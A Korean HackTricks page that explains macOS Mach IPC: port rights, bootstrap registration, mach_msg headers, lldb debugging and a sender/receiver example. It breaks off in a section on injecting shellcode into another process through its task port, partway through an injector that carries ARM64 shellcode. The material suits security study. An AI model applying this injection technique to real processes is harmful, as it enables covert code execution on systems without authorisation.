# macOS IPC - 프로세스 간 통신

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소로 **PR 제출**을 통해 여러분의 해킹 기술을 공유하세요.

</details>

## Mach 메시징을 통한 포트

### 기본 정보

Mach는 **작업**을 **리소스 공유의 가장 작은 단위**로 사용하며, 각 작업은 **여러 스레드**를 포함할 수 있습니다. 이러한 **작업과 스레드는 1:1로 POSIX 프로세스와 스레드에 매핑**됩니다.

작업 간 통신은 Mach Inter-Process Communication (IPC)을 통해 발생하며, 일방향 통신 채널을 활용합니다. **메시지는 포트 간에 전송**되며, 이는 커널에서 관리되는 **메시지 큐와 유사한 역할**을 합니다.

**포트**는 Mach IPC의 **기본 요소**입니다. 메시지를 **보내고 받는 데 사용**할 수 있습니다.

각 프로세스에는 **IPC 테이블**이 있으며, 거기에는 **프로세스의 mach 포트**를 찾을 수 있습니다. mach 포트의 이름은 실제로 숫자(커널 객체에 대한 포인터)입니다.

프로세스는 또한 **다른 작업에게 일부 권한을 가진 포트 이름을 보낼 수 있으며**, 커널은 이를 **다른 작업의 IPC 테이블에 등록**합니다.

### 포트 권한

작업이 수행할 수 있는 작업을 정의하는 포트 권한은 이 통신에 중요합니다. 가능한 **포트 권한**은 ([여기에서 정의된 내용](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **수신 권한**은 포트로 전송된 메시지를 수신할 수 있게 합니다. Mach 포트는 MPSC (다중 생산자, 단일 소비자) 큐이므로 전체 시스템에서 각 포트에 대해 **하나의 수신 권한만** 있을 수 있습니다 (여러 프로세스가 하나의 파이프의 읽기 끝에 대한 파일 디스크립터를 모두 보유할 수 있는 파이프와는 달리).
* **수신 권한을 가진 작업**은 메시지를 수신하고 **보내기 권한을 생성**할 수 있으며, 처음에는 **자체 작업만이 포트에 대한 수신 권한**을 가지고 있었습니다.
* 수신 권한의 소유자가 **죽거나 종료**하면 **보내기 권한이 무용지물이 됩니다 (데드 네임).**
* **보내기 권한**은 포트로 메시지를 보낼 수 있게 합니다.
* 보내기 권한은 **복제**될 수 있어서 보내기 권한을 가진 작업이 권한을 복제하고 **제3 작업에게 부여**할 수 있습니다.
* **포트 권한**은 Mac 메시지를 통해 **전달**될 수도 있습니다.
* **한 번 보내기 권한**은 포트로 한 번의 메시지를 보낼 수 있고 그 후 사라집니다.
* 이 권한은 **복제**될 수 없지만 **이동**될 수 있습니다.
* **포트 세트 권한**은 단일 포트가 아닌 _포트 세트_를 나타냅니다. 포트 세트에서 메시지를 디큐하는 것은 그 포트가 포함하는 포트 중 하나에서 메시지를 디큐합니다. 포트 세트는 Unix의 `select`/`poll`/`epoll`/`kqueue`와 매우 유사하게 여러 포트에서 동시에 수신할 수 있습니다.
* **데드 네임**은 실제 포트 권한이 아니라 단순히 자리 표시자입니다. 포트가 파괴되면 포트에 대한 모든 기존 포트 권한이 데드 네임으로 변합니다.

**작업은 SEND 권한을 다른 작업에게 전달**하여 다시 메시지를 보낼 수 있게 합니다. **SEND 권한은 복제**될 수 있어서 작업이 권한을 복제하고 **제3 작업에게 권한을 부여**할 수 있습니다. 이는 **부트스트랩 서버**라는 중간 프로세스와 결합되어 작업 간 효과적인 통신을 가능하게 합니다.

### 파일 포트

파일 포트를 사용하면 Mac 포트(맥 포트 권한 사용)에 파일 디스크립터를 캡슐화할 수 있습니다. 주어진 FD를 사용하여 `fileport_makeport`를 사용하여 `fileport`를 만들고 `fileport_makefd`를 사용하여 fileport에서 FD를 만들 수 있습니다.

### 통신 설정

이전에 언급했듯이 Mach 메시지를 사용하여 권한을 보낼 수 있지만, 이미 Mach 메시지를 보낼 권한이 없는 경우 **권한을 보낼 수 없습니다**. 그렇다면 첫 번째 통신은 어떻게 설정됩니까?

이를 위해 **부트스트랩 서버**(**mac의 launchd**)가 관여되며, **누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있으므로**, 다른 프로세스에게 메시지를 보낼 권한을 요청할 수 있습니다:

1. 작업 **A**는 **새 포트**를 생성하여 **그것에 대한 수신 권한**을 얻습니다.
2. 수신 권한을 보유한 작업 **A**는 **포트에 대한 SEND 권한을 생성**합니다.
3. 작업 **A**는 **부트스트랩 서버**와 **연결**을 설정하고, 처음에 생성한 포트에 대한 **SEND 권한을 부트스트랩 서버에 보냅니다**.
* 누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있습니다.
4. 작업 A는 부트스트랩 서버에 `bootstrap_register` 메시지를 보내 **주어진 포트를 `com.apple.taska`와 같은 이름과 연결**합니다.
5. 작업 **B**는 **부트스트랩 서버**와 상호 작용하여 서비스 이름에 대한 부트스트랩 **조회를 실행**합니다 (`bootstrap_lookup`). 따라서 부트스트랩 서버가 응답하려면 작업 B는 조회 메시지 내에서 **이전에 생성한 포트에 대한 SEND 권한을 부트스트랩 서버에 보냅니다**. 조회가 성공하면 부트스트랩 서버는 작업 A로부터 받은 SEND 권한을 **복제**하고 **작업 B에게 전송**합니다.
* 누구나 부트스트랩 서버에 SEND 권한을 얻을 수 있습니다.
6. 이 SEND 권한으로 **작업 B**는 **작업 A에게 메시지를 보낼 수 있습니다**.
7. 양방향 통신을 위해 일반적으로 작업 **B**는 **수신** 권한과 **보내기** 권한이 있는 새 포트를 생성하고 **보내기 권한을 작업 A에게 주어서 작업 B에게 메시지를 보낼 수 있게 합니다** (양방향 통신).

부트스트랩 서버는 작업이 주장한 서비스 이름을 인증할 수 없습니다. 이는 **작업**이 잠재적으로 **시스템 작업을 가장할 수 있음**을 의미합니다. 예를 들어 권한 서비스 이름을 가장하고 모든 요청을 승인할 수 있습니다.

그런 다음 Apple은 시스템 제공 서비스의 이름을 안전한 구성 파일에 저장합니다. 이 파일은 SIP로 보호된 디렉토리인 `/System/Library/LaunchDaemons` 및 `/System/Library/LaunchAgents`에 있습니다. 각 서비스 이름 옆에는 **관련된 이진 파일도 저장**됩니다. 부트스트랩 서버는 이러한 서비스 이름 각각에 대한 **수신 권한을 생성하고 보유**합니다.

이러한 사전 정의된 서비스의 경우 **조회 프로세스가 약간 다릅니다**. 서비스 이름을 조회할 때, launchd는 서비스를 동적으로 시작합니다. 새로운 워크플로우는 다음과 같습니다:

* 작업 **B**는 서비스 이름에 대한 부트스트랩 **조회**를 시작합니다.
* **launchd**는 작업이 실행 중인지 확인하고 실행 중이 아니면 **시작**합니다.
* 작업 **A** (서비스)는 **부트스트랩 체크인**(`bootstrap_check_in()`)을 수행합니다. 여기서 **부트스트랩** 서버는 SEND 권한을 생성하고 보유하며 **수신 권한을 작업 A에게 전송**합니다.
* launchd는 **SEND 권한을 복제하고 작업 B에게 전송**합니다.
* 작업 **B**는 **수신** 권한과 **보내기** 권한이 있는 새 포트를 생성하고 **보내기 권한을 작업 A**에게 주어서 작업 B에게 메시지를 보낼 수 있게 합니다 (양방향 통신).

그러나 이 프로세스는 사전 정의된 시스템 작업에만 적용됩니다. 비시스템 작업은 여전히 처음에 설명한 대로 작동하며, 이는 가장할 수 있는 가능성을 열어둘 수 있습니다.

{% hint style="danger" %}
따라서 launchd가 절대로 충돌해서는 안 되며, 그렇게 되면 전체 시스템이 충돌합니다.
{% endhint %}
### Mach 메시지

[더 많은 정보는 여기에서 찾을 수 있습니다](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 함수는 본질적으로 시스템 호출로, Mach 메시지를 보내고 받기 위해 사용됩니다. 이 함수는 보내려는 메시지를 초기 인수로 필요로 합니다. 이 메시지는 `mach_msg_header_t` 구조체로 시작해야 합니다. 그 뒤에 실제 메시지 내용이 이어집니다. 이 구조체는 다음과 같이 정의됩니다:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
프로세스가 _**수신 권한**_을 가지고 있으면 Mach 포트에서 메시지를 수신할 수 있습니다. 반대로 **보내는 쪽**은 _**보내기**_ 또는 _**한 번 보내기 권한**_을 부여받습니다. 한 번 보내기 권한은 한 번의 메시지를 보낸 후에 무효화됩니다.

초기 필드 **`msgh_bits`**는 비트맵입니다:

* 첫 번째 비트(가장 중요함)는 메시지가 복잡함을 나타내는 데 사용됩니다(자세한 내용은 아래 참조)
* 3번째와 4번째는 커널에 의해 사용됩니다
* 2번 바이트의 **가장 낮은 5개 비트**는 **바우처**(key/value 조합을 보내는 또 다른 유형의 포트)에 사용할 수 있습니다.
* 3번 바이트의 **가장 낮은 5개 비트**는 **로컬 포트**에 사용할 수 있습니다.
* 4번 바이트의 **가장 낮은 5개 비트**는 **원격 포트**에 사용할 수 있습니다.

바우처, 로컬 및 원격 포트에 지정할 수 있는 유형은 [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에서 확인할 수 있습니다:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
예를 들어, `MACH_MSG_TYPE_MAKE_SEND_ONCE`는 이 포트를 위해 파생 및 전송되어야 하는 **한 번만 보내기 권한**을 나타내는 데 사용될 수 있습니다. 또한 수신자가 응답을 보낼 수 없도록 하려면 `MACH_PORT_NULL`을 지정할 수 있습니다.

쉬운 **양방향 통신**을 위해 프로세스는 메시지 헤더의 **_응답 포트_**(**`msgh_local_port`**)라고 불리는 mach 포트를 지정할 수 있으며, 메시지의 **수신자**는 이 메시지에 대한 응답을 보낼 수 있습니다.

{% hint style="success" %}
이러한 종류의 양방향 통신은 응답을 기대하는 XPC 메시지에서 사용되며 (`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`), **일반적으로 서로 다른 포트가 생성**되어 양방향 통신을 생성하는 방법에 대해 이전에 설명한 대로 사용됩니다.
{% endhint %}

메시지 헤더의 다른 필드는 다음과 같습니다:

* `msgh_size`: 전체 패킷의 크기.
* `msgh_remote_port`: 이 메시지가 전송된 포트.
* `msgh_voucher_port`: [mach 바우처](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: 이 메시지의 ID로, 수신자에 의해 해석됩니다.

{% hint style="danger" %}
**mach 메시지는 `mach 포트`를 통해 전송**되며, 이는 mach 커널에 내장된 **단일 수신자**, **다중 송신자** 통신 채널입니다. **여러 프로세스**가 mach 포트로 **메시지를 보낼** 수 있지만 언제든지 **단일 프로세스만** 읽을 수 있습니다.
{% endhint %}

그런 다음 메시지는 **`mach_msg_header_t`** 헤더, **바디** 및 **트레일러**(있는 경우)로 형성되며, 응답 권한을 부여할 수 있습니다. 이러한 경우에는 커널이 메시지를 한 작업에서 다른 작업으로 전달하기만 하면 됩니다.

**트레일러**는 **커널에 의해 메시지에 추가된 정보**로 (사용자가 설정할 수 없음) 메시지 수신 시 `MACH_RCV_TRAILER_<trailer_opt>` 플래그로 요청할 수 있습니다(요청할 수 있는 다양한 정보가 있음).

#### 복잡한 메시지

그러나 커널이 수신자에게 이러한 객체를 전송해야 하는 추가 포트 권한이나 메모리 공유와 같은 더 **복잡한** 메시지도 있습니다. 이러한 경우에는 헤더 `msgh_bits`의 가장 상위 비트가 설정됩니다.

전달할 수 있는 가능한 디스크립터는 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에서 정의되어 있습니다.
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### 32비트에서는 모든 디스크립터가 12B이며 디스크립터 유형은 11번째에 있습니다. 64비트에서는 크기가 다양합니다.

{% hint style="danger" %}
커널은 다른 작업으로 디스크립터를 복사하지만 먼저 **커널 메모리에 복사본을 생성**합니다. 이 "Feng Shui" 기술은 여러 악용으로 **커널이 자신의 메모리에 데이터를 복사**하도록 만들어 프로세스가 자신에게 디스크립터를 보낼 수 있게 합니다. 그런 다음 프로세스는 메시지를 수신할 수 있습니다 (커널이 이를 해제합니다).

취약한 프로세스로 **포트 권한을 보낼 수도** 있으며, 포트 권한은 프로세스에 나타날 것입니다 (그가 처리하고 있지 않더라도).
{% endhint %}

### Mac Ports APIs

포트는 작업 네임스페이스에 연결되므로 포트를 생성하거나 검색하려면 작업 네임스페이스도 쿼리됩니다 (`mach/mach_port.h`에서 자세히 설명):

* **`mach_port_allocate` | `mach_port_construct`**: 포트를 **생성**합니다.
* `mach_port_allocate`는 **포트 세트**를 생성할 수도 있습니다: 포트 그룹에 대한 수신 권한. 메시지를 수신할 때 어디서 메시지가 왔는지 표시됩니다.
* `mach_port_allocate_name`: 포트의 이름을 변경합니다 (기본적으로 32비트 정수)
* `mach_port_names`: 대상에서 포트 이름 가져오기
* `mach_port_type`: 이름에 대한 작업의 권한 가져오기
* `mach_port_rename`: 포트의 이름 바꾸기 (FD의 dup2와 유사)
* `mach_port_allocate`: 새로운 RECEIVE, PORT\_SET 또는 DEAD\_NAME 할당
* `mach_port_insert_right`: 수신할 수 있는 포트에 새 권한 생성
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: **mach 메시지를 보내고 받는** 데 사용되는 함수입니다. 덮어쓰기 버전은 메시지 수신을 위한 다른 버퍼를 지정할 수 있게 합니다 (다른 버전은 그냥 재사용합니다).

### Debug mach\_msg

함수 **`mach_msg`**와 **`mach_msg_overwrite`**는 메시지를 보내고 받는 데 사용되는 함수이므로 이러한 함수에 중단점을 설정하면 보낸 메시지와 받은 메시지를 검사할 수 있습니다.

예를 들어 디버깅할 수 있는 어떤 애플리케이션을 시작하면 **`libSystem.B`를 로드**할 것이므로 이 함수를 사용할 것입니다.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**의 인수를 얻으려면 레지스터를 확인하십시오. 이것이 인수들입니다 ([mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) 참조):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
레지스트리에서 값을 가져옵니다:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
첫 번째 인수를 확인하여 메시지 헤더를 검사하십시오.
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
그 유형의 `mach_msg_bits_t`는 응답을 허용하기 위해 매우 일반적입니다.



### 포트 나열
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**이름**은 포트에 지정된 기본 이름입니다 (첫 3바이트에서 **증가**하는 방법을 확인하십시오). **`ipc-object`**는 포트의 **가려진** 고유 **식별자**입니다.\
또한 **`send`** 권한만 있는 포트는 해당 소유자를 **식별**하는 방법을 주목하십시오 (포트 이름 + pid).\
또한 **`+`**를 사용하여 **동일한 포트에 연결된 다른 작업을 나타내는** 방법에 주목하십시오.

또한 [**procesxp**](https://www.newosxbook.com/tools/procexp.html)를 사용하여 **등록된 서비스 이름**도 볼 수 있습니다 (SIP가 비활성화되어 있어 `com.apple.system-task-port`가 필요한 경우):
```
procesp 1 ports
```
### 코드 예시

**sender**가 포트를 할당하고 `org.darlinghq.example`라는 이름에 대한 **send right**를 생성하여 **부트스트랩 서버**로 보내는 방법에 주목하십시오. 수신자는 해당 이름에 대한 **send right**를 요청하고 이를 사용하여 **메시지를 보내는** 방법을 사용했습니다.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}sender.c 파일{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### 특권 포트

* **호스트 포트**: 프로세스가이 포트에 대한 **Send** 권한을 갖고 있으면 **시스템에 대한 정보**를 얻을 수 있습니다 (예 : `host_processor_info`).
* **호스트 priv 포트**: 이 포트에 대한 **Send** 권한이있는 프로세스는 커널 확장 프로그램을로드하는 것과 같은 **특권 작업**을 수행 할 수 있습니다. **이 권한을 얻으려면 루트 여야합니다**.
* 또한 **`kext_request`** API를 호출하려면 다른 엔타이틀먼트 **`com.apple.private.kext*`**가 필요하며이는 Apple 이진 파일에만 제공됩니다.
* **작업 이름 포트**: _작업 포트_의 특권이없는 버전입니다. 작업을 참조하지만 제어하지는 않습니다. 이를 통해 사용할 수있는 유일한 것은 `task_info()`입니다.
* **작업 포트** (또는 커널 포트)**:**이 포트에 대한 Send 권한이있으면 작업을 제어 할 수 있습니다 (메모리 읽기 / 쓰기, 스레드 생성 등).
* `mach_task_self()`를 호출하여 호출자 작업에 대한이 포트의 이름을 **받습니다**. 이 포트는 **`exec()`**를 통해만 **상속**됩니다. `fork()`로 생성 된 새 작업은 새 작업 포트를받습니다 (`exec()` 후에 suid 이진 파일에서도 특별한 경우로 작업은 새 작업 포트를받습니다). 작업을 생성하고 해당 포트를받는 유일한 방법은 `fork()`를 수행하는 동안 ["포트 스왑 댄스"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)를 수행하는 것입니다.
* 이 포트에 액세스하는 제한 사항 (바이너리 `AppleMobileFileIntegrity`의 `macos_task_policy`에서):
* 앱에 **`com.apple.security.get-task-allow` 엔틀리먼트**가있는 경우 **동일한 사용자의 프로세스가 작업 포트에 액세스** 할 수 있습니다 (주로 디버깅을위한 Xcode에서 추가). **노타리제이션** 프로세스는 프로덕션 릴리스에 대해 허용하지 않습니다.
* **`com.apple.system-task-ports`** 엔틀리먼트가있는 앱은 커널을 제외한 **모든** 프로세스의 **작업 포트를 얻을 수 있습니다**. 이전 버전에서는 **`task_for_pid-allow`**라고 불렸습니다. 이것은 Apple 애플리케이션에만 부여됩니다.
* **루트는** **하드닝 된** 런타임으로 컴파일되지 않은 응용 프로그램의 작업 포트에 액세스 할 수 있습니다 (Apple에서 제공하지 않음). 

### 작업 포트를 통한 스레드 내 셸코드 삽입

다음 위치에서 셸코드를 가져올 수 있습니다:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}엔터틀먼트.plist{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

이전 프로그램을 **컴파일**하고 동일한 사용자로 코드를 주입할 수 있도록 **엔타이틀먼트**를 추가하십시오 (그렇지 않으면 **sudo**를 사용해야 합니다).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


